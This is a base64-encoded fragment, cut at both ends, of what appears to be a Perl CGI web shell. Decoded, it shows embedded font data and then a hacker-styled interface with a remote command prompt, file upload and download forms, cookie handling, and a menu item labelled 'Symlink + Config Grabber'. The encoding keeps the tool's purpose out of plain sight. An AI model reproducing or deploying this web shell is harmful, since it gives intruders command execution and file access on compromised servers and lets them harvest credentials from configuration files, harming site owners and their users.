ZEVxVGtsaHdFOU5BQjZXRTg1WGdPNnY2b0cwY05pQlNYVThEUkxyN0IvZkoxM09aeXFVMDdWaWZsMUNvQm9SVkd1VW1wRzY0UW56RnEvSTdHU0tyNlZpUVZtNG1PNVB6T3JPSXZqTTJOZ1YrWCtYVVVVc25vV3E0TlRrT1FxVE5jNGkybkgzVE4xd0lGcGpGTGs5eEdxSTVIZjM3eTZscFJXaWZrR21vR1Vtc1g4Y2pVWHVYNm01a3lBdjFlblpCL3JlSG5kckUxMk03UXFzbnRkbldCN0VoZ2RYdXBZdFp5eWVtbDRBVmJMelEyZ2dUT0o3SC9Xeml6d0NPMXJWN0JCVE5YaFgxOHhOWGZOMnZZUVp1NTZObTNxU2FUVENjelI0VE8ySjdsWHVKZkFIalV5TnpBVFRHNFo0cHNsS1hrbCtOUlZ5WnlkMEtKcGZLNmR0RDZaMXpZc3M1dGp1QzBkbWI4T1JMeU44anB0QW9WRDg3N3lPdmdZU0VycnFJckJuZy95amZDZW51cEZhQUFqYnJJdlcwbDF5enBiemhXdlZaUk9ybW9KN1FUcXMrVXFGb1hwWS9CV0xvTi9GWTdEd1FaQlpoYlJOcUU1Z3c4ZjZ5YVpFQnhKOXFrTkUxUDc5bVlVREx2aHRWSW9KL3FnV3ExSk5jNnNlYWtoRWZvSTg1UXllL1doNWsxTm50cXk5ZTN4YnNGbTI1SHVIUXdFdTlQRXdCYjIzZkdweGphWElaTEkrcHEyUmpLRHRVMmJtb0xIRzlhR09zcmRaWnBvdkdrZEdmMkpMUkRteFZaaXFSL29XbFpxRWpmc3BSUFNYRmZYWENnM2hpeEhqOGZIREhhK2RGbFVYTEs4YzJ0ajNXMUJiMnAzbzZ2N1IyMmIxcFRkcS9ZRktEeE9lNmxtcGpDQ1N6K0ptV3dQN2d2MjZpWnphZXFmcTgxVjBlbUl6OHBRQ2xZYVdVWG5QS2htS0VWQnNJMVhSNU5wNUhwUXlKdGNmcTN5ckNkL0hEUi9jRWtTSHc5djh0QUhJUldmY0xaUUs5WTVHY3EwbXFFa0N6Vm9iUjdyZGhjM1MyQ09FbmRSR0h5V2lYK2V2MldyeDhYRjU2UW82L3krMzFJZmp2WkNCUnlGdlZEREg5OE50WHErYnFpUi8zbzNWSVNNSDljUnRRV0I0a0pkVWRrbmk3bWsvOCtNQ2JIZXg0MXBtQ0s4QlFkVm9nWUhpbU1hb1dPS1lBWEExY2UwZUw0eFJkVXhBVFpabFAyOVI0V0k3ZU9HNVZmQ0NBdU9TNWdPSTRDZFVzWldSOGNXWjdMTXlhdVBEbkZCUnNFRkNWQ2FxMFNwNm1JUkRTeFdBdEt6Qno2KzNPQUZWRkNqQWdhd2JRb3FxQzJpZ2xJRXQrTUEwN1FLUnBNVEdWakFodVZUMDI4MEs5akJJMXdMaTdnRkFoRWZ4elhOUEZHSkJWbDR4NVZSaVdMZlZld0JTL3V6ek9tN1NydTBLQTFYWjNSYnBXa3c3TEVxZWE2dHd5b3MxYm1kVllkaGNjN2JWUFhkNlJ6dmY1VSs5N1hSWjNkcjU5TFhpd3R0WGdKYnB2SytDbjBqUUo4UDQyL3owRmMrSDMzK1lvOWF0L2NhZTlUU3JPOWNHcCtscTJaZUlqdG14dDBVT3V0b2Y5MDRkbmVmcjhPdUZFdkpIbGdpNFNRTk43c3U1c3NWK1MvbjZSYkUyWU1ZcitJY1U1aWFHcnZGMkYxRlp3M0hGcm4vMDQxM3cxZHR3dnZQYzhWOC9uYTg4OFhkQnRTZTdsVk1HdXRHS3RUSWtaUVNsY2V3cmFCR08yU2t6MS9Gc2lJUDRORU1saFdGQkZ1ZTA1WGEwVkxqUW5iQnNGTFl5ODNES0x1Q2RkbGlNd3MzQUJrYU9rZUxURnZDMk9adVdhK21uUXQwQTM5enBuMlgzN2dxK25yczZVQzkyQi9kbHY1cDdQdTFud3oxbnRqZGQ3QlBQTzFOdFNXYSs5Sk9OalVrRG00bmowMitXK3RyM1Y5L3c5Mk5vZnJRUnQrZk5MWVBydHRVK01lbk5yMTg1bzcya1JQZHRUdTdFbTMzbmVpSWgvbE16YmRvTDFQYTI3bVI1clErTjdmajZ6d0pyV1h6dFlCTllCUk5UV2lWQ0htTkp4akJCME5MQmd5SVRUV0ZsWmVpOStwWUlpS0c4V0FQc2ZLcTdQeXRZaGRLQ2M5dUlkdDlGUjl6Ym50WnpaSDVNOEpGRzNoTzNVcy9JNjg2cS9Qc0h5S3ZPdTFKVUZpeVlBUGFEUWhJRm1wQ3l6NDJsUS8rbjA4M2hSNEwwdjFaQ2pvV0lweThVNHdqS1hTUFhKa0xua1gzSHlJWFBJTnVDaTRXSk55Z3dJb0ZLYjgwblFkV2FHOVU4OEQzRlBQQVJkcXordDh6RC95RUZaZU5WcTJscVByRHBJT3YwdTM0NkZWV1Q5MkNuWkM1eUx5cjZQTHVxUTdKUmR4MUR1eElNUmY4T1pWTG9TS1hvclRUT2VhQzNiTnl3WlhXeVhGSEpRWmh2SXBOcWVScEVRMndhenhwcklialN1SkdXaXFxNldFbEoreWxJaEdLVXBIQXN1MEZSR0p1YkVYdGF6RVRURjNKcVllTFpzVXp4WmFtS1JnMWgwSGJWS055T1ZOY3I5MnplaEwxTTYzY0tXNlM5c0x3NFo1NnN5anJTNG9kek9uV3lCSUZFR2d1U254U05tSy8raVJ0czZzK2VYeUJCN1gzYzgyWGY5cVVTVGMycGpOTnhYZnl5dGhZNGUxVVcxc3EwYnFlL1g5VDY5ZW5FbTAzS0d2d0dlNGM5eDdqWlJZQkZkdlZ2UExpNGd4VjRScFVOaHo0ckxTL2NVek5KaS9EZ0lIYUVpRW1QS0czT2JWS2YyT3owZzV4TWZhM2RtS211UXB6eVdWTVJZMlNTNFpoWnVmTkpsZGZrVTdXMll1YlhDTjBNZzdkMXIyaFA1SEIrV2k2ZDNsM2Y1K1lPV2V4azd2OE44U0dEdXp3cjQvdE9naGY2VXkwRHJXTzFwL1pocE1SQ1EyMWpqU2UyVnAvUzVTODQzRk5GQklleDhUSjdKWm9zUS9ZbS9RNUk0Z1oxODNYVmRnN1gxZGhuOXBWT0NlNHlxaW5jOVhPd3FqbDUzUVhmZzZWKzN3ZGhybC9LdWFUWjlMVytwK21iVnh3dVQzSWNvc2dsWDBjaWFqUTU1QklpMnZucHpGWnpBOHFOQ3FZdG1NK0dzdm5vOUZmekNtN2FMRzE0UGJRQm5vVzJ6VlFpaXA4RHFsN0ZNMDlMNjJyWm1KYmhkNGl0cjE3THNWem9hMmFVM2JSbkhMNVZFNVpIY3Y0WWtzcEhLOVNqbGVKTXpFdU5xK0MwWHk4Z0N5QWJlY01zMjhlRDI3ZU1UODBIN2FsdlhWQm5pcGhyYy9iWFRjODFWMjMrbjk1ZDExTVdIOXNoMTBTUkJIOW1ENjcyaWVvc0tvOSsySDhEa0FiM2Vyem1zcUt6MnVxVW52MnE0QURFOWpPWkJKUmgxOTlhQk9pRHI5ajZxRk5aWmpDdHFONm0vSFFKdnVWRDIyYTBiZS8rTnltMnAwcnVvL3VxSnZkdVQrODd1WjBlc09Ld2puZHMrVUZROERYTlByVXJpdmI5L2ZzNjQ2RnF4VDdvY3hsSGN6bFVtWWw4L0xjMmNSZDlTdFM4aUtRNDJWSittRDU0TVY4UkpIU2lQS1lWNWpvOFpUTENkSWJWNDdIeFh4S2tkNVZmNFQ1bHlOQkpSWVN4OGZpZ0dGdzJ1UmxLMmcvbC8rRVhDeTBWajVXVnM3T1hUc2ZJemc2OTl3WVNPYWpkN2pYdFF6b2owV0laMmdYSVE5SE8yVnl5ck1RNVVvT08xVGxqV1k3YnBFeHFnc0xINGRpeHNnd2JTWmtNZFBDYWtzNTdWdGxBaThmOFUwNXR0emw3Rm1xczNHdmtCbTdHcFJUeGpENEpKQkttK1JIOXZBMlJIb3o5dEhvc1BwcVZ2SWk4Nk52dWV2S3lmM3FucHJlMnN6NWk2ZUdCcU9MOWI2WUxmT1piSURkU2xwSWgwR2psdkNiU0p4Yy8rdmZtVmp1SmFPMmRmOTNaK1FiSW9Cd0c1a1RUQzZFbnFFL0pjY3h4SjJrQ0FFN2QyVTR6S0RsVndzaGpLQ3R4dmpnT2lYbmE2STVYeXl2RUdEQXE1TVk2VWE4YXpaTjBveERFdjNqa0JaR0pnaXlvUkxlNjJ5NVVoZk5HWmlGSEk4UGlBVTJvRytOU1dENGtRZC90Tm8yenBnWEo5RmtaSVJaKzNOdzdTazVoQmxQSEpqT0lzeHVCeGRPVWRSWEgxaXpzYW50cy83d3h0cjMyTUtYM2JHbXVLOU9kRVg3NHkzM1JVUDkzVTBiR2dJbkxBRXhGSWg2UzgzbFlqQVE5NW5JZzMrWGpxWnF5VS82eGc5MmRkKzI0VE9GY2xPNVBidWpLOFg3eC95ZWptMzlOM1Uva04vVTlLZGI2ckszM3RmWU9McXB2clovajIzM29TUEsrbFhxZTNvWm5uYWxIWnBkNFlPR3ZUb2xPd3hZWDA0NzFDcmxQdU51RTlZdkNjcHFGY1M4V3ltazk5UERJV1hwMG5JL2ZPUzFBNWhISFNOSms1VkRXRnBmV1gzMUlxR0YxdFlWaFVQNzV0c0pNbDhWMGZOWHJoOUNESm9vK3g3Z0JTMTRCSkpXbExqVVZCc3ZYYkdOVjRsR2FYY29FNjFLcWJLUGdTaittV2IzbEVFbnpNODFHemtmK0dFK2tGSEpUbHY2anBjWjdlQnhhVFdUS3ZySVc1UUdldlFaRldWWWlJK0xpWFpta2cyV0dXMnQ1N2hPUDc5YXVma0NrWVNaL1JpWldkMFdtZC8vSEhPSS9Jd2JaQWVWNXpzcVRvTHlxS09wNXp1aVUzQ0kvUVg1MmVIRDhIdUcvRXpEWFBYM0F2eGV3OUNmdzcwVDNIYjJaZTA1OE5VV015aFoyaEprbWZxd0gyUWdkdlJDbzJGaHFCSm5sQTZCeUszcFRtOEpzZi9CRFlGd1MxM0MybGpibjIxcjE0UnJSd2M2VFBzTVFrVWlvdnRNckxOckI5eEw1RGF4TDJsUEsvZXlpL25TNlhzWlp0OUwyVCtKOXdJVE1MMUwwc0xxaVRqak51S3RZeHYrUjJWWEU5ckdGWVQzN1Z1dDFwSXNXN0Yrb2tpS284ank0Z3BwMFc2TkkwdEVqbHFFQ05RSUk0UWpTakRCT0RGcXF4WTM5a0dZa0loU1NpaW10QVczOUZCS0QwWDRJQmtUUkFtQlVFb2dVSHdvRFpnY2V1aWh1QVVmU2crbGNUZDk4OTdLMnNwSlN3L0xMZ052WitidG01MTVQL01OM3BkY284cUVPQTlNWGtuZmVyTTRDSG9wK2g3L0hRcjlIMTZXLytUMWhZblZMTldReGxmenVJR2JkQjFHNWdvY2pPZFRHb0F3QW5hWVg2V2JKdVNuNkxRRGRodGRJejFyWjNWaW9FL2JrajBGKzlWdGkwZ1JsOXJCVVhZV3NiK1hvLzJFK1VqeG5jVlE1TUowM0pITzVQTHBNdG96S09lQTh2Skw2VXVDa2xxNW5IZXNTYzVRTENvV2sxcHBybktNUW5Vb0V4Mis2dWt3b3JSa0RTRFBWSXFrUlhXUWpuUUltblVnL2RmbTRWY2VkTFhkTXRQQjYyYzY5UGRvdEo5UU5na0x3cU83Sm4wSTRRcitrMGdhandwekNzaWVmc3VRL1o4VWtGLy9EVGU1UHpnWGlmSHlNSkpiMFNQNVQ2ZzB2QlBKdjVUSTcyRHJTV2ZzTExKejlKREFUa1NwcTIyN2ZWUjZIOTB0L1ZmcDgyOEhUTExmaStSU0p0a1hONTJKZ2xna1loYVptS3ZTRU8zMEhvWHRKZStqSzlpSHQwamZKeWlTSjdGQnF4QXpibDFUdE5GL21YR0RrY3NkWDkvWWx3dEx1ZXh5UVpZTHk5bmNVa0htMzAxVjV4UTRIcGl1RmhXbFdLVStLUHYwWjN5Zis5YkkrU3B4MndNUXpYakNtcmFESlc2RXZING9vS3FVYWhDTWRjUm53alZEZ2F0ZXhpR3NMUkxKcHA3alVjelAyVXd5bVlFTFhTSWgyL1IwTXBsQ3BlNVRPWjdMeFo5eGdXM0wzQXIvTmY2TStCSXZaM0lmZHFHTGxqdEFFWG1SakVLckR4K3U4aEw2YUViZjByY3VrTFo1MG5hUHRnMTMyN1o0ZFVjNGFrNXJuTFFRREFBQXN4c2dUY2c3VUVqL2FRZVZVR2xHZjAydlFyMFMwb2QzTFRZdUNZaW1DWG9tbjh3b25IRE8xSU1CTnovaEhJeEJ4aHdVbDRpUXFIQ0FFazVwNEtsYUo5bXBaY3VqOW1reTZZSmp5S2N0VVAwbFNmMjBUQVI0SWRYMjJHaWlGYzBPRzM5eE1vT21JcE1hT3pMQkVLR3RZV3RZZEh1Q3lFY2VURHVHNC9MRmRaNWYzNGorK3MzY05UVWNXNTY2M2ZDZ1RiOWU0M24weGttOUUvaTRQbHVMalkxK2N2bUhIMFBvODRZNzdnc28zc2JlOSs2UmpXSFBwemNidmtUQUYzYzN2cndSOEg0d1BQN0xMbHN6aWZLUDhhN3dPMmNsTWZBdFZxbTRQVGlzYVFZMFlndXJYVGhqS0w0bGVWV1dOQ2YyMEJMRmJsbm5iWkdpSllxUU1XZGhXQVFHMXRvWVJSL1k4VEtjV29pT3h5U2EvQWxJcEU1YUtKUG0welBIRnlIeEM4V0FEQ0NZTUVSSWhDZGJJN0lUZTZKb3ZiR0d3cUxET1dTclZSWnFOcWZETHE3eHZNQ1hYeTBLQW8rRjk2OWUxV2ZSdGo2N3RGbS9kazdmUjc2cGFuMXpVYXBjcjA4Y0hFelVyMWNrWnA5Z05CM2NJWllqZDA5QzAyS0hESDhVMjZtMXNwdmhZNU91c0F1YUhCYkEzbEtRKzB2ckpaN2x4am1PMWp5QW1nRHNLNGFReHRRd0wwNjZORmZxOVZablFmVzdGWG1sY25qWTVPUFp1REl6bzhTei9pYlVKdTA4Y0h3b2lUZHJyQ3dwYW1xWmpLYWRQLzlrQWQ4NXZNaStWK3JwQVQ0dytENlhLNW00a3ZBWXFQME10YWJOUHpIcXU3MXluTjFmdThKYThNbDdzY253c0xnaDNQZ2IxNHRMWHdBQUFIamFZMkJrQUlJelp3em5yWGtjejIvemxVR2VBeVRBY082TTZrMEUvVzhKQ3dQYkVpQ1hnNEVKSkFvQW02WU5TSGphWTJCa1lHQmI4cmNJUkRJQUFRc0RBeU1ES25nQkFGRmNBN0o0Mm5XVHNVdkRRQlRHWDFvUlIrbWFvWU1FQndjUndSSkVBaUlkZ2hRSlJSeEtodUlnTGlWSUVjZmc0QkNrWkhGd0ZCRmNIQnlLRlA4TU4yY1J3Y2xaeE8vZGZjVjRhT0RIOS9KeWQrL2RkNWZhdTJ3Sm5wbGZlRWRnRG5FTERFQUFJdVJ1b0s5a0NGTGtWa0FUSE9MOTNPYmtrdDlQUUF6T3VFNE9EaXc2M3RONis1eWorZ2dTME9ENGxEb2grdDREWStaUG1kOEVHVmdIRjlTTTdJQSs4RGx1bFRIbWU3cXZFZmhnM1hua090QmpVTEtuaE9UVWtyWExTdHhsbkZUMG1mdldlUVhZQUl2c0xXYWZWNmgzejNpYjNnOVpWL2Zac2IyYU1RVjliN1BmM05aVjcwM3VrMzZxUjErSWE2REhma0w2SGRtODhlK081N29BbHVoOTR4OWFYSGZpTUhZSUt1ZmdNcUwySFh6dXY2VHZmeEU1WnpGbDRKQlYvSGRKcVlWRHpEa3g5eG5SYzczL0wvVkVaUFphWktxMU5SSHZGdmdXZVlKMm9hazV1K1lQNWw4US9oL0xGdGtEdStSTmErbGNmTU85OE5xNkx2c0k2ZzhtRGlYOEJ1SHFYd1o0Mm1OZ1lOQ0J3eXFHTFl3em1JeVlyakVYTU05aVBzTDhnY1dIcFkvbENNc2pWaEZXRDlaOXJQL1lDdGllc2R1d3YrTkk0bGpBcWNZNWpmTVdseHFYRFZjY1Z3blhJKzR5bmlTZU43d092Rk40TC9DeDhSWHhyZUo3eEsvRW44VGZJY0FoNENVd1QrQ0RZSVRnQ1NFbm9TS2hiY0xIUkd4RXFrUzJpTHdUbFJMMUU2MFFuU2E2VHZTY1dJRFlHckYvNGpIaSt5UUNKSTVKOGtqbVNWNlE0cE1La3RvajlVZmFUM3FOREkrTWk4d0dXUTVaSDlsdGNydmtmc2tYeWE5UUVGRXdVSmlqOEVQaGg2S2I0allsRmFVNXloektlc3FQVkZSVXpxbjZxZWFvVGxIZHBGYWlOa250aGJxWmVvOEdoNGFHUnBYR01ZMHZtbGFhVFpwWE5MOW9WV2p6YVQvUkNkUDEwL1BRZHpISU1weGt0TTJZejNpUzhRMFRPWk1za3dlbWFxWTVwdHZNak14V21ldVo5NWkvc3ZDeXVHV1pZdGxteFdVVlliWENtc0c2enZxUWpaVE5GbHM3MnpOMmNmWVM5aGNjT2h5REhCODUrVGh0YzFaeFB1RWk0Wkxoc3NmVnluV0xtNFhiRkxjUDduN3VEenp5UERaNUduazJlRjd5MHZKYTRhM2gzZWZqNVhQQU44LzNsWitRWHd3T21PVlg0ZGZtTjg5dm05OGJmeVgvQ1A5ZEFWSUJGUUViQWdXQVVDOHdDQWpQQkhrRVpRUXRDYm9GQUdRYmxxTUFBUUFBQU9rQVRRQUZBQUFBQUFBQ0FBRUFBZ0FXQUFBQkFBSEVBQUFBQUhqYW5aSzdTZ05CRkliLzNjUkxVSUlSQ1JZaVU0aWRtNDFHMEZTQ1FTemNSdkRTYmk3R1lDNnlHUkhCd21md0NTeDlBcDlCd2NyS0o3SDJuOW16aXNGRUNVTW0zNXp6bjh2T0hBQTV2Q0VGSjUwQmNNOWZ6QTd5UE1Yc0lvdEg0UlIyOENTY3hpbytoQ2V3NkN3SlQyTEZLUWxQNGM0NUZaN0dzdk11bkNFbnNUTW91UXZDcytSOTRUbmszVnZoSExKdTBzODg3US9DeitTa254ZjQ3aXQyMGNNbGJoQ2hoU2JPb2FHd0RoOUZMa1Z2aUM0VlhYcHI1RFp0QjlUVTRaRU1HM3VEL2o3M09pMVg1RG81SW12bWEvRC9DRlZyMTl3VjltdysvU082Wm5WRlp2VUgxSUZWOTNCSVJaT1dOcnVJaG1qVWdFcmgySGJTWngyalVNenVZV3RvamNINC8wUW5zV3NqT3d6dHJmeCtuMFp0dmo2eThTM1cwN1p1ZkorYUZOb2I3VmpsQmYyS0djNytlSjJLUFd2cFBPQXBaUGJFUDlwcnBrQnpLc29vY0YzYjVkSCtIZE9SQ0k5MWV6d1Z4b29aLzZWUHFLbnlEcEpKaWljbmtPK3AwRnV6ODdrdDAxekdKbC9PN1A3WGZHOThBb3RPbGx3QWVOcHQwRVZzRkhFVXgvSHZhM2U3N2RiZEtlNHlNOXVwNEx0dEIzZDNDclZGV3RpeXVJYmlFZ2dKTndoMkFZSnJJTUFCQ0c1QkFodzQ0K0VBWEdIYStYUGpKUytmdlAvaDkxNytSTkJTZjl4MDVuLzF5VzZSQ0lra0VoZHVvdkFRVFF4ZVlva2puZ1FTU1NLWkZGSkpJNTBNTXNraW14eHl5U09mVmhUUW1qYTBwUjN0NlVCSE90bWJ1dENWYm5TbkJ6M3BoWWFPZ1k5Q1RJb29wb1JTZXRPSHZ2U2pQd01ZaUo4QVpaUlRnY1VnQmpPRW9ReGpPQ01ZeVNoR000YXhqR004RTVqSUpDWXpoYWxNWXpvem1Na3NabE1wTG83U3hDWnVzSitQYkdZM096akFjWTZKbSsyOFp5UDdKRW84N0pKb3RuS2JEeExEUVU3d2k1Lzg1Z2luZU1BOVRqT0h1ZXloaWtkVWM1K0hQT014VDNocS8xTU5MM25PQzg1UXl3LzI4b1pYdkthT0wzeGpHL01JTXArRkxLQ2VRelN3bUVXRWFDVE1FcGF5ak04c1p5VXJXTVVhVm5PVnc2eGpMZXZad0ZlK2M0MnpuT002YjNrblhvbVZPSW1YQkVtVUpFbVdGRW1WTkVtWERNbmtQQmU0ekJYdWNKRkwzR1VMSnlXTG05eVNiTWxocCtSS251Ujd3dlZCVGRQS0hYV2xYMU9xT1dBb2ZVcFRXZHFzWVFjb2RhV2g5Q2tMbGFheVNGbXNMRkgreS9NNzZpcFgxNzAxd2Rwd3FMcXFzckhPZVRJc1I5TnlWWVJERFMyRGFaVTFhd1djTzJ5TnZ3NnJtVlFBQUhqYVBjdzlFc0ZBSEFYd2JGWTJrYytOQ1Nvek1YUmJhYlFhU1pQR3FMSXp6bUZHcDFGeUNnZjRSK1VTanVBc1BLenQzdS9ObTNkbnJ4T3hzOU5Rc0drN3hpNjZxNFZxcHlSMVE4VVc0YWduSk5TdWRZaVhGWEcxSmxGV04vNTAxUmNlSUs0R1BjQTdHUGlmMmNNZ0FQeWhRUjhJc2g4WWhlWTJRaHRLVjNXODNvTXhHSTBzRXpCZVdhWmdzckRNd0hSdUtjRnNacG1EY213NUFQUGxuNW9LOVFiaUJrcXNBQUFCVXFaMVdnQUEpIGZvcm1hdCgnd29mZicpOw0KICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7DQogICAgZm9udC1zdHlsZTogbm9ybWFsOw0KDQp9DQoNCmJvZHkgew0KZm9udC1mYW1pbHk6ICJ1YnVudHVfbW9ub3JlZ3VsYXIiOw0KZm9udC1zaXplOjEycHg7DQpiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsNCmJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCmJhY2tncm91bmQtY29sb3I6IzJkMmIyYjsNCmNvbG9yOmxpbWU7DQpiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZE